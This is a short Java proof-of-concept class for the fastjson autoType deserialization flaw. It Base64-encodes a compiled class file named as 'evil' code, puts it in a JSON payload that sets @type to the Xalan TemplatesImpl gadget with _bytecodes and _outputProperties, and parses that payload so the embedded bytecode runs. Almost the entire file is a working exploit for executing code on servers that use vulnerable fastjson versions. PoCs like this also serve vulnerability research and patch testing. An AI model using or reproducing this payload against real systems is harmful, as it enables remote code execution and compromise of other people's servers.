package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Poc {

    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void testAutoTypeDeny(String rootPath) throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = rootPath + fileSeparator + "WEB-INF" + fileSeparator + "classes"
                + fileSeparator + "person" + fileSeparator + "Test.class";
        String evilCode = readClass(evilClassPath);
        final String nastyClass = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + nastyClass
                + "\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },"
                + "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    }

    public static void run(String rootPath) {
        try {
            testAutoTypeDeny(rootPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
